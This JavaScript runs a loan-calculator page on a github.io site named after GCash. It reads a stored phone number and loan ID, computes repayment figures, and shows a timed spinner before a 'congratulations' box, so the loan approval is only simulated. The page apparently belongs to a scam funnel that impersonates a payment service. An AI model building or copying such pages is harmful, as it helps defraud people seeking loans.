window.addEventListener("load", () => {
    if(!sessionStorage.getItem("LoanID")) {
        window.location.replace("https://gcash-loan-grants.github.io/get-grants/");
    } else {
        let loanID = sessionStorage.getItem("LoanID");
        let phoneNumber = sessionStorage.getItem("phone");
        document.getElementById("elementor-number").innerHTML = phoneNumber;
        document.getElementById("elementor-id").innerHTML = "ID:" + " " + loanID;
    };
    if(!sessionStorage.getItem("savings")) {
        sessionStorage.setItem("savings", 0);
        document.getElementById("savings").innerHTML = sessionStorage.getItem("active-loan");
    };
    if(!sessionStorage.getItem("disbursement")) {
        sessionStorage.setItem("disbursement", 0);
        document.getElementById("disbursement").innerHTML = sessionStorage.getItem("disbursement");
    };
    if(!sessionStorage.getItem("discount")) {
        sessionStorage.setItem("discount", 0);
        document.getElementById("discount").innerHTML = sessionStorage.getItem("discount");
    };
    if(!sessionStorage.getItem("repayment")) {
        sessionStorage.setItem("repayment", 0);
        document.getElementById("repayment").innerHTML = sessionStorage.getItem("repayment");
    };
});

function validateForm() {
    if(document.getElementById("loan-amount").value == "") {
        document.getElementById("error-msg").innerHTML = "*Input loan amount";
        return false;
    } else {
        sessionStorage.clear();
        document.querySelector(".submit-button").classList.add("hide-display");
        document.querySelector(".spinner-button").classList.remove("hide-display");
        setTimeout(() => {
            document.querySelector(".submit-button").classList.remove("hide-display");
            document.querySelector(".spinner-button").classList.add("hide-display");
            document.querySelector(".elementor-congrat-box").classList.remove("hide-display");
        }, 2000);
    }
}
function calculateInput() {
    if(document.getElementById("loan-amount").value == "") {
        document.getElementById("savings").innerHTML = 0;
        document.getElementById("disbursement").innerHTML = 0;
        document.getElementById("discount").innerHTML = 0;
        document.getElementById("repayment").innerHTML = 0;
    } else if(document.getElementById("loan-amount").value > 30000) {
        document.getElementById("error-msg").innerHTML = "Max offer is &#8369;30000";
    } else {
        let disbursement = document.getElementById("loan-amount").value;
        sessionStorage.setItem("disbursement", disbursement);
        document.getElementById("disbursement").innerHTML =  "&#8369;" + sessionStorage.getItem("disbursement");
        let savings = Number((disbursement / 100) * 0.5).toFixed(2);
        document.getElementById("savings").innerHTML = "&#8369;" + savings;
        let discount =  Number((disbursement / 100) * 2).toFixed(2);
        sessionStorage.setItem("discount", discount);
        document.getElementById("discount").innerHTML =  "&#8369;" + sessionStorage.getItem("discount");
        let repayment = Number(disbursement) + Number(((document.forms["loan-form"]["loan-amount"].value / 100) * 5).toFixed(2));
        sessionStorage.setItem("repayment", repayment);
        document.getElementById("repayment").innerHTML = "&#8369;" + sessionStorage.getItem("repayment");
    }
}
function clearError() {
    document.getElementById("error-msg").innerHTML = "";
}